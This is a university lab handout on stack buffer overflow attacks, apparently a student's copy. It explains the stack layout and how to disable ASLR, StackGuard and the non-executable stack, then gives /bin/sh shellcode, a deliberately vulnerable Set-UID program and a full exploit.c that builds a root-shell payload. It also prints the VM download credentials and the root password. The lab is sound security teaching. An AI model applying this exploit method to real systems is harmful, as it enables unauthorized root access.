@@ -1,0 +1,395 @@
+--- Page 1 ---
+Security Lab
+Student
+Name:
+Michael
+Mendoza
+
+--- Page 2 ---
+Buffer Overflow Attack
+For this Lab, you should use “Ubuntu32” from this link:
+http://www.cse.unt.edu/downloads/vm/
+Login credentials for download:
+username: vmdownload
+password: d0wnloadVMf1les! (bold are numbers)
+_____________________________________________________
+When logging in to the system, the username is “Tawfiq
+Shah”
+and the password is “untccdc”.
+_____________________________________________________
+1. Lab Overview
+The learning objective of this lab is for students to gain the first-hand experience on the buffer
+overflow vulnerability. Buffer overflow is defined as the condition in which a program attempts to
+write data beyond the boundaries of pre-allocated fixed length buffers. This vulnerability can be
+utilized by a malicious user to alter the flow control of the program and even to execute arbitrary
+pieces of code. This issue arises due to mixing of the storage for data (e.g., buffers) and controls (e.g.,
+return addresses): an overflow in the data part can affect the control flow of the program, because an
+overflow can change the return address.
+In this lab, you will be given a program with a buffer overflow vulnerability. Your task is to develop a
+scheme to exploit the vulnerability and finally to gain the root privilege. In addition to the attacks, you will
+be guided to walk through several protection schemes that have been implemented in the operating
+system to counter against such types of attacks.
+Make sure to perform this lab on Ubuntu32 VM (Ubuntu 12.04 32-bit).
+2. Overview of Stack:
+A stack is a contiguous block of memory containing data. The stack consists of logical stack
+frames that are pushed when calling a function and popped when returning. A stack frame contains
+the parameters to a function, its local variables, and the data necessary to recover the previous
+stack frame, including the value of the instruction pointer at the time of the function call.
+Depending on the implementation, the stack will either grow down (towards lower memory
+addresses), or up. In the Ubuntu OS on an Intel x86 architecture, which you will use for this lab,
+stack grows downwards.
+
+--- Page 3 ---
+A CPU register called the stack pointer (SP) points to the top of the stack. The bottom of the stack
+is at a fixed address. Its size is dynamically adjusted by the kernel at runtime. The CPU
+implements instructions to PUSH onto and POP off of the stack.
+The stack pointer (SP) is also implementation-dependent. It may point to the last address on the
+stack, or to the next free available address after the stack. For our discussion, we will assume that it
+points to the last address on the stack. In addition to the stack pointer, which points to the top of
+the stack (lowest numerical address), it is often convenient to have a frame pointer (FP) which
+points to a fixed location within a frame. In principle, local variables could be referenced by giving
+their offsets from SP. However, as words are pushed onto the stack and popped from the stack,
+these offsets change. Although in some cases the compiler can keep track of the number of words
+on the stack and thus correct the offsets, in some cases it cannot, and in all cases considerable
+administration is required. Furthermore, on some machines, such as Intel-based processors,
+accessing a variable at a known distance from SP requires multiple instructions. Consequently,
+many compilers use a second register, FP, for referencing both local variables and parameters
+because their distances from FP do not change with PUSHes and POPs.
+Local variables of a function are stored below (at a lower address) in memory. The return address is
+stored above (at a higher address) to FP. If we know the FP, we can try to calculate memory
+locations at which return address and local variables are stored. On Intel CPUs, the stack Base
+Pointer (BP/EBP) is used for this purpose. Due to the way the stack grows, actual parameters have
+positive offsets (stored above the FP) and local variables have negative offsets from FP. The first
+action a procedure must perform when called is to save the previous FP (so that it can be restored at
+the procedure exit). Then, it copies SP into FP to create the new FP, and advances SP to reserve
+space for the local variables. This code is called the procedure prolog. Upon the procedure exit, the
+stack must be cleaned up again – something called the procedure epilog. See the below example
+that illustrates the stack layout for a function.
+In order to successfully exploit the vulnerability described above, we need to do the following:
+1. Find the return address.
+2. Create an exploit code to overwrite the buffer.
+3. Overwrite the buffer:
+i. Overwrite the return address to make it point to a further location in the buffer, where
+our malicious code resides.
+ii. Put malicious code in the right location specified by the return address
+(which we changed).
+
+--- Page 4 ---
+Finding the address in the memory which stores the return address:
+From the above figure, we see that if we can find out the address of buffer[] array, we can
+calculate where the return address is stored. There are two ways to do this:
+1. One can debug the vulnerable program (provided in Section 3.5 below). In the debugger,
+one can figure out the address of buffer[], and thus calculate the starting point of
+the malicious code.
+2. One can modify the copied program, and ask the program to directly print out the address
+of buffer[]. In this lab, we use the second approach: We simply add a “print” statement to
+print the starting address of buffer[] and then try to estimate the location (address) of
+the return address.
+If the target program is running remotely, one may not be able to rely on the debugger to find out
+the address. In addition, in most real-time scenarios, one cannot simply modify the binary to print
+the buffer address. However, one can always guess in those situations. The following facts make
+guessing quite a feasible approach:
+ Stack usually starts at the same address (assuming that stack randomization – see Section
+3.1 – is disabled).
+ Stack is usually not very deep: Most programs push about a few hundred (or thousand)
+bytes into the stack at any single time.
+For these reasons, the range of addresses that one needs to guess is actually quite small.
+Once we have successfully learned the return address, we can overwrite it with the address of our
+malicious code.
+Finding the starting point of the malicious code:
+If one can accurately calculate the address of buffer[], one should be able to accurately
+calculate the starting point of the malicious code. We can place the malicious code in the buffer
+after a certain offset (distance) from the modified return address. Even if we cannot accurately
+calculate the address (for example, for remotely run programs), we can still guess. To improve our
+chances of success, we can add a number of NOPs (“no-operations”, i.e., instructions which do
+nothing) to the beginning of the malicious code. This way, if we can jump to any of these NOPs,
+we can eventually get to the malicious code. The following figure depicts the attack.
+
+--- Page 5 ---
+3. Overview of Shell code and Vulnerable Program:
+Ubuntu and other Linux distributions have implemented several security mechanisms to make
+the buffer overflow attack difficult. In order to improve the performance of our attacks, we need to
+disable them first.
+3.1 Address Space Layout Randomization (ASLR).
+Ubuntu and several other Linux-based systems use ASLR to change the starting address of heap
+and stack. This makes guessing the addresses difficult (remember that this is one of the critical
+steps of the buffer overflow attacks). In this lab, we disable these features using the following
+command:
+sysctl -w kernel.randomize_va_space=0
+3.2 The StackGuard Protection Scheme.
+The GCC compiler implements a security mechanism called “StackGuard” to prevent buffer
+overflows. In the presence of this protection, a straightforward buffer overflow attack strategy that
+we are trying to implement will not work. One can disable this protection when compiling
+the program using the following option: “-fno-stack-protector”. For example, to compile a
+program example.c with Stack Guard disabled, you may use the following command:
+$ gcc -o example -fno-stack-protector example.c
+3.3 Non-Executable Stack.
+Ubuntu used to allow executable stacks, but this has now changed: the binary images of programs
+(and shared libraries) must declare whether they require executable stacks or not, i.e., they need
+to mark a field in the program header. The kernel or dynamic linker uses this marking to decide
+whether to make the stack of this running program executable or non-executable. This marking is
+
+--- Page 6 ---
+done automatically by the recent versions of gcc, and by default, the stack is set to be non-
+executable. For our shellcode to work (i.e., to successfully exploit the vulnerable application),
+we need the stack to be executable. In order to enable this, the following option should be used
+when compiling programs:
+gcc -z execstack -o test test.c
+3.4 Shellcode
+Before we start the attack, we need a shellcode, which is a machine code exploiting some
+vulnerability. Typically, it starts the command shell (hence the name “shellcode”), which allows
+the attacker to control the target machine. It has to be loaded into the memory so that one can
+force the vulnerable program to jump to it. Consider the following program:
+#include <stdio.h>
+int main( )
+{
+char *name[2];
+name[0] = ‘‘/bin/sh’’;
+name[1] = NULL; execve(name[0], name, NULL);
+}
+The shellcode that we use is the assembly version of the above program.
+The following program shows you how to launch the shell by executing a shellcode stored in
+a buffer.
+/*call_shellcode.c*/
+/*A program that creates a file containing the code for launching
+shell*/
+#include <stdlib.h>
+#include <stdio.h>
+const char code[] =
+"\x31\xc0" /*Line 1: xorl %eax,%eax*/
+"\x50" /*Line 2: pushl %eax*/
+"\x68""//sh" /*Line 3: pushl $0x68732f2f*/
+"\x68""/bin" /*Line 4: pushl $0x6e69622f*/
+"\x89\xe3" /*Line 5: movl %esp,%ebx*/
+"\x50" /*Line 6: pushl %eax*/
+"\x53" /*Line 7: pushl %ebx*/
+"\x89\xe1" /*Line 8: movl %esp,%ecx*/
+"\x99" /*Line 9: cdq*/
+"\xb0\x0b" /*Line 10: movb $0x0b,%al*/
+"\xcd\x80" /*Line 11: int $0x80*/
+;
+int main(int argc, char **argv)
+{
+char buf[sizeof(code)];
+strcpy(buf, code);
+((void(*)( ))buf)( );
+}
+Shell code can be compiles with the following command:
+gcc -z execstack -o call_shellcode call_shellcode.c
+We will place a code similar to the above in a suitable format into a file, which will be used by
+
+--- Page 7 ---
+the vulnerable program (we call it stack.c). When the vulnerable program “stack” loads the file
+(we call it badfile), the shell code in the file will overwrite the buffer of the vulnerable program.
+A few places in this shellcode are worth explaining. First, the third instruction pushes “//sh”, rather
+than “/sh” into the stack. This is because we need a 32-bit number here, and “/sh” has only 24 bits.
+Fortunately, “//” is equivalent to “/”, so we can get away with a double slash symbol. Second,
+before calling the execve() system call, we need to store name[0] (the address of the string), name
+(the address of the array), and NULL to the %ebx, %ecx, and %edx registers, respectively. Line 5
+stores name[0] to %ebx; Line 8 stores name to %ecx; Line 9 sets %edx to zero. There are other
+ways to set %edx to zero (e.g., xorl %edx, %edx); the one (cdq) used here is simply a shorter
+instruction: it copies the sign (bit 31) of the value in the EAX register (which is 0 at this point) into
+every bit position in the EDX register, basically setting %edx to 0. Third, the system call execve()
+is called when we set %al to 11, and execute “int $0x80”.
+3.5 The Vulnerable Program
+/*stack.c*/
+/*This program has a buffer overflow vulnerability.*/
+/*Our task is to exploit this vulnerability*/
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+int bof(char *str)
+{
+char buffer[12];
+/*print the starting address of buffer*/
+printf("the starting address of buffer is %p\n", buffer);
+/*The following statement has a buffer overflow problem*/
+strcpy(buffer, str);
+/*Print the frame pointer address*/
+printf("Frame Pointer Address is: %p\n", __builtin_frame_address(0));
+/*you use this address to find return address*/
+return 1;
+}
+int main(int argc, char **argv)
+{
+char str[517];
+FILE *badfile;
+badfile = fopen("badfile", "r");
+fread(str, sizeof(char), 517, badfile);
+bof(str);
+//printf(" the address of stack pointer is: 0x%x\n", __asm__("movl %esp,
+%eax"));
+printf("Returned Properly\n");
+return 1;
+}
+The above program has a buffer overflow vulnerability. It first reads an input from a file called
+“badfile”, and then passes this input to another buffer in the function bof(). The original input can
+have a maximum length of 517 bytes, but the buffer in bof() is only 12 bytes long. Because
+strcpy() does not check boundaries, a buffer overflow will occur. Since we will make this program
+
+--- Page 8 ---
+a Set-UID program owned by root, if a normal user can exploit this buffer overflow vulnerability,
+this normal user might be able to get a root shell.
+It should be noted that the program gets its input from a file called “badfile”. This file is under
+users’ control. Now, our objective is to create the contents for “badfile”, such that when
+the vulnerable program copies the contents into its buffer, a root shell can be spawned.
+In the function “bof”, we have added a line to print the starting address of the buffer, so that
+we can calculate the location (address) of the return address and then overwrite it.
+Note that this is for learning purpose only. In a real-life attack, you cannot modify an existing
+binary. Instead you have to guess the return address. Disabling randomization (in Step 3.1) makes
+this guessing feasible.
+4. Buffer overflow Lab:
+Type the following commands:
+1. Change to root user from normal user:
+sudo su root
+Password: (enter root password) – “untccdc”
+Now, you are a root user. Observe a change in prompt from $ to #.
+2. Disable address space randomization:
+sysctl -w kernel.randomize_va_space=0
+Question 1: Attach a screenshot.
+
+--- Page 9 ---
+3. Copy the stack.c into your Linux VM:
+Tip: For example, you can email it to yourself, and access it via the web browser
+in the VM.
+Note: If you copy-paste from the manual, use the DOCX file, as copy-pasting from
+the PDF file may add unwanted extra symbols.
+4. Compile “stack.c”:
+gcc -o stack -z execstack -fno-stack-protector stack.c
+5. Make the stack executable and Set-UID:
+chmod 4755 stack
+The executable program “stack” color changes to red after the chmod command.
+(See the below screenshot.)
+
+--- Page 10 ---
+6. Exit from the root user prompt (to a normal user):
+exit
+Observe the prompt change from # to $.
+7. Create an empty file “badfile”:
+touch badfile
+8. Run the application (do it twice):
+./stack
+./stack
+9. Delete the badfile:
+rm -rf badfile
+Step 8 will print the buffer starting address and frame pointer. The values has to be same
+both times.
+Question 2: What are the addresses? (Attach a screenshot.)
+
+--- Page 11 ---
+Starting Address: 0xbffff254
+Frame Pointer address: 0xbffff268
+Exploiting the Vulnerability:
+10. Make a note of the buffer starting address and the frame pointer address.
+In our case, these are 0xbffff144 and 0xbffff158, respectively (see the above screenshot).
+What is the distance between the two? Typically, it will be some number of bytes, but it
+may vary.
+11. Find the address (location) of the return address. It is 4 bytes away from the frame pointer.
+In our case, the return address is stored in the locations 15c-15f. Let us call it an offset.
+(The frame pointer value is stored in 168-16b).
+12. You need to calculate an appropriate address (call it a safe_offset) to overwrite the return
+address. At some point after safe_offset, you will write your shellcode to the buffer.
+Now, the return address points to this “safe offset” to execute our shellcode.
+In the below code, we have chosen 0xbffff174 as our safe_offset (48 locations away from
+
+--- Page 12 ---
+the buffer starting address 0xbffff144 and 20 locations away from the return address
+0xbffff16c). You may need to increase or decrease the distance between buffer and
+safe_offset for it to work perfectly. Here, you have to use the trial-and-error method a few
+times in order to find a perfectly working safe_offset.
+13. In the line
+memcpy(buffer+60,shellcode,sizeof(shellcode))
+in the below code, we used “buffer+60”, which means that our shellcode starts from
+the address 60 of the buffer, and this has to be after the safe_offset.
+14. Now, you have to write your safe_offset address location in the big endian style and assign
+it to “char *ret” variable. For example, the big endian style for the address “0x12345678” is
+\x78\x56\x34\x12”, and for “0xbffff174”, it is “\x74\xf1\xff\xbf”.
+In brief, all you have to do is: Run the “stack” program, get the buffer pointer and the frame
+pointer addresses, select an address after the frame pointer as safe_offset, assign it to “ret” in
+the big endian style and start writing the shellcode after the safe_offset (buffer+distance to
+safe_offset+some_value).
+Hint: Usually, on a 32-bit Ubuntu, the buffer in the stack starts on 0xbffff144 or 0xbffff154 or
+0xbffff164, etc. So, change the safe_offset and buffer+distance values accordingly. For the buffer
+address 0xbffff154 use 0xbffff184 as safe_offset, for 0xbffff164 use 0xbffff194. The shellcode
+starting address can begin at “buffer+60”.
+If you were not successful in finding the right values, try the below addresses in the exploit.c
+for “char * ret”:
+\x74\xf2\xff\xbf
+\x64\xf2\xff\xbf
+\x54\xf2\xff\xbf
+\x44\xf2\xff\xbf
+\x34\xf2\xff\xbf
+Code for “exploit.c”:
+/*exploit.c*/
+/*A program that creates a file containing the shellcode*/
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+char shellcode[]=
+"\x31\xc0" /*xorl %eax,%eax*/
+"\x50" /*pushl %eax*/
+"\x68""//sh" /*pushl $0x68732f2f*/
+"\x68""/bin" /*pushl $0x6e69622f*/
+"\x89\xe3" /*movl %esp,%ebx*/
+"\x50" /*pushl %eax*/
+"\x53" /*pushl %ebx*/
+"\x89\xe1" /*movl %esp,%ecx*/
+"\x99" /*cdq*/
+"\xb0\x0b" /*movb $0x0b,%al*/
+"\xcd\x80" /*int $0x80*/
+;
+
+--- Page 13 ---
+void main(int argc, char **argv)
+{
+char buffer[517];
+FILE *badfile;
+/*Assign the return address in big endian style*/
+char * ret ="\x74\xf1\xff\xbf"; //here goes your safe_offset address
+int i=0;
+/*Initialize buffer with 0x90 (NOP instruction)*/
+memset(&buffer, 0x90, 517);
+/*Fill the buffer with shell code starting from a value after safe offset*/
+memcpy(buffer+60,shellcode,sizeof(shellcode)); //copy shellcode into buffer
+/*Overwrite return address*/
+for(i=0;i<32;i+=4)
+memcpy(buffer+i,ret,sizeof(ret));
+/*Save the contents to the file "badfile"*/
+badfile = fopen("./badfile", "w");
+fwrite(buffer, 517, 1, badfile);
+fclose(badfile);
+}
+15. Copy the above code to a file “exploit.c”.
+(See Item 3 for hints and warnings regarding copying the code.)
+16. Compile exploit.c
+gcc -o exploit exploit.c
+17. Run exploit to create badfile
+./exploit
+ls
+cat badfile (This command prints the badfile to the terminal).
+(You will likely see some unreadable characters as it is the binary of your shellcode.)
+Question 3: Attach a screenshot of the “badfile” contents as printed to the terminal
+by the above command.
+
+--- Page 14 ---
+Important Note: Compile your vulnerable program first. Please note that the program
+“exploit.c”, which generates the “badfile”, can be compiled with the default StackGuard
+protection enabled. This is because we are not going to overflow the buffer in this program.
+We will be overflowing the buffer in “stack.c”, which is compiled with the StackGuard
+protection disabled.
+18. Now, run the vulnerable program “stack”. If your exploit is implemented correctly,
+you should be able to get a root shell:
+./stack
+If your exploit works correctly, you should get the root prompt “#”.
+It should be noted that although you have obtained the “#” prompt, your real user id
+remains the same – i.e., that of the normal user, but the effective user id is now 0 (root).
+You can check this by typing the following:
+19. Type “id” at #(root prompt).
+Question 4: Attach the resulting screenshot.
+
+--- Page 15 ---
+Note: The screenshot that was obtained by us is shown on the next page, for your reference.
+Useful links:
+A sample chapter on the buffer overflow attacks in the book by Wenliang Du: “Computer &
+Internet Security: A Hands-on Approach, Second Edition”.
+https://www.handsonsecurity.net/files/chapters/buffer_overflow.pdf
